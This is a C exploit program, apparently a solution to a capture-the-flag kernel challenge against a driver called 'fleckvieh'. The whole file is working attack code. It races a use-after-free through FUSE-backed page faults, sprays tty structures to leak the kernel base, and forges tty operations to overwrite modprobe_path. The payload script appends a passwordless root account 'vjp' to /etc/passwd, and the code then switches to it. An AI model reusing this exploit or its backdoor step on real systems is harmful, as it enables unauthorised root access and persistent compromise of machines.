#define _GNU_SOURCE
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/mman.h>
#include <signal.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <linux/userfaultfd.h>
#include <sys/wait.h>
#include <poll.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/prctl.h>
#include <sys/shm.h>
#include <sys/xattr.h>
#include <pthread.h>
#include <string.h>
#include <sched.h>
#include <errno.h>
#define FUSE_USE_VERSION 29
#include <fuse.h>
#include "tty.h"
#define PAGE 0x1000
#define log_info(...) { \
    printf("[*] "); \
    printf(__VA_ARGS__); \
    putchar('\n'); \
};
#define log_err(...) { \
    printf("[!] "); \
    fprintf(stderr,__VA_ARGS__); \
    putchar('\n'); \
};
#define errExit(...){ \
    log_err(__VA_ARGS__); \
    exit(-1); \
};

#define pause() getchar()
#define DEVICE_NAME "fleckvieh"
#define CMD_ADD 0xf1ec0001
#define CMD_DEL 0xf1ec0002
#define CMD_GET 0xf1ec0003
#define CMD_SET 0xf1ec0004

typedef struct {
  int id;
  size_t size;
  char *data;
} request_t;

int global_fd;
int64_t buf_[0x80];
char read_buf[0x400];
request_t req = {
    .id = 0,
    .size = 0x2e0 ,
};
void open_dev(){
    global_fd = open("/dev/"DEVICE_NAME,O_RDWR);
    if(global_fd < 0)
        errExit("open");
    log_info("Opened dev file");
}
int blob_add(){
    return ioctl(global_fd,CMD_ADD,&req);
}
int blob_del(){
    return ioctl(global_fd,CMD_DEL,&req);
}
int blob_get(){
    return ioctl(global_fd,CMD_GET,&req);
}
int blob_set(){
    return ioctl(global_fd,CMD_SET,&req);
}
int ptmx_fd;
int spray[50];
int64_t _text;
int64_t tty_ops_addr;
int64_t tty_driver;
_Bool overwrite = 0;
int64_t* fake_tty_struct;
cpu_set_t  pwn_cpu;
int pwn_fuse_fd;
struct fuse_operations fops;
_Bool setup_done = 0;
int64_t* page2leak;
int64_t* page2write;
int64_t fake_ops_addr;
#define mount_point "/tmp/fuse_mount"

int getattr_callback(const char* path,struct stat* stbuf){
    fputs("[*] getattr called\n",stderr);
    memset(stbuf,0,sizeof(struct stat));
    if(strcmp(path,"/file") == 0){
        stbuf->st_mode =  S_IFREG | 0777;
        stbuf->st_nlink = 1;
        stbuf->st_size = 0x100;
        return 0;
    }
    return -ENOENT;
}

int open_callback(const char *path, struct fuse_file_info *fi) {
  fputs("[+] open_callback\n",stderr);
  return 0;
}
int fault_cnt_case = 0;
ssize_t read_callback(const char *path,
                char *buf, size_t size, off_t offset,
                struct fuse_file_info *fi){
        fputs("[+] read_callback\n",stderr);
        if (strcmp(path, "/file") == 0){
            switch (fault_cnt_case++)
            {
            case 0:
                log_info("First pagefault! UAF Read");
                log_info("Kfree");
                blob_del();
                for(size_t i =0;i<25;i++){
                    spray[i]=open("/dev/ptmx",O_RDONLY | O_NOCTTY);
                    if(spray[i] < 0)
                        errExit("ptmx %zu",i);
                }
                return size;
                break;
            case 1:
                log_info("Second pagefault! UAF Write");
                log_info("Kfree");
                blob_del();
                for(size_t i =0;i<50;i++){
                    spray[i]=open("/dev/ptmx",O_RDONLY | O_NOCTTY);
                    if(spray[i] < 0)
                        errExit("ptmx %zu",i);
                }
                page2leak[3] = fake_ops_addr;
                memcpy(buf,page2leak,0x20);
                return 0x20;
                break;
            
            default:
                break;
            }
        }
        return -ENOENT;
}

struct fuse_operations fops = {
  .getattr = getattr_callback,
  .open = open_callback,
  .read = read_callback,
};
void* fuse_thread(void *){
    struct fuse_args args = FUSE_ARGS_INIT(0, NULL);
    struct fuse_chan *chan;
    struct fuse *fuse;
    if(mkdir(mount_point, 0777)){
        errExit("mkdir(\"/tmp/fuse_mount\")");
    }
    if((chan = fuse_mount(mount_point,&args)) == NULL){
        errExit("fuse_mount");
    }
    if((fuse = fuse_new(chan,&args,&fops,sizeof(fops),NULL)) == NULL){
        errExit("fuse_new");
    }
    if (sched_setaffinity(0, sizeof(cpu_set_t), &pwn_cpu))
        errExit("sched_setaffinity");
    fuse_set_signal_handlers(fuse_get_session(fuse));
    setup_done = 1;
    log_info("Setup FUSE done");
    fuse_loop_mt(fuse);

    fuse_unmount(mount_point, chan);
    return NULL;
}

void *mmap_fuse_file(){
    int fuse_fd = open(mount_point"/file",O_RDWR);
    if(fuse_fd == -1)
        errExit("open %s",mount_point"/file");
    void* page = mmap(NULL,PAGE, PROT_WRITE | PROT_READ,MAP_PRIVATE,fuse_fd,0);
    if(page == MAP_FAILED)
        errExit("mmap %p",page);
    log_info("mmap %p",page);
    return page;
}

int main(int argc,char** argv,char** envp){
    CPU_ZERO(&pwn_cpu);
    CPU_SET(0, &pwn_cpu);
    if (sched_setaffinity(0, sizeof(cpu_set_t), &pwn_cpu))
        errExit("sched_setaffinity");
    open_dev();
    pthread_t th;
    pthread_create(&th, NULL, fuse_thread, NULL);
    while (!setup_done);

    
    req.size = 0x2e0;
    req.data = read_buf;
    req.id = blob_add();
    log_info("ID = %d",req.id);

    //Stage1: leak
    page2leak = mmap_fuse_file();
    req.size = 0x2e0;
    req.data = page2leak;
    blob_get();
    _text = page2leak[3]-0xc3c3c0;
    int64_t chunk_addr = page2leak[7]-0x38;
    log_info("kernel's _text @ 0x%lx",_text);
    log_info("chunk @ 0x%lx",chunk_addr);

    
    //Stage2: store fake tty_operations
    struct tty_operations fake_ops = {0};
    fake_ops.lookup = 0x4142434445464748;
    fake_ops.ioctl = _text+0xb8c55; // mov QWORD PTR [rdx],rsi ; ret

    memcpy(read_buf,&fake_ops,sizeof(fake_ops));
    req.size = 0x2e0;
    req.data = read_buf;
    for(size_t i=0;i<100;++i){
        if(i<25)
            close(spray[i]);
        req.id = blob_add();
    }
    fake_ops_addr = chunk_addr;
    log_info("fake_ops maybe @ 0x%lx",fake_ops_addr);

    //Stage3 : Overwrite
    req.size = 0x400;
    req.id = blob_add();

    page2write = mmap_fuse_file();
    req.size = 0x20;
    req.data = page2write;
    blob_set();

    //Stage4: Trigger
    int64_t modprobe = _text+0xe37ea0; //
    int32_t* p = (int32_t *)"/tmp/vjp";
    for(size_t i=0;i<50;++i){
        ioctl(spray[i],p[0],modprobe);
        ioctl(spray[i],p[1],modprobe+4);
    }
    
    system("echo -e \"#!/bin/sh\necho 'vjp::0:0:root:/:/bin/sh' >> /etc/passwd\" > /tmp/vjp");
    system("chmod +x /tmp/vjp");
    system("echo -e '\x13\x37\x42\x42' > /tmp/pwn" ); //Non-ascii for /tmp/pwn
    system("chmod +x /tmp/pwn"); 
    system("/tmp/pwn" );  // trigger call modprobe_path
    system("grep vjp /etc/passwd" );
    system("su vjp");
}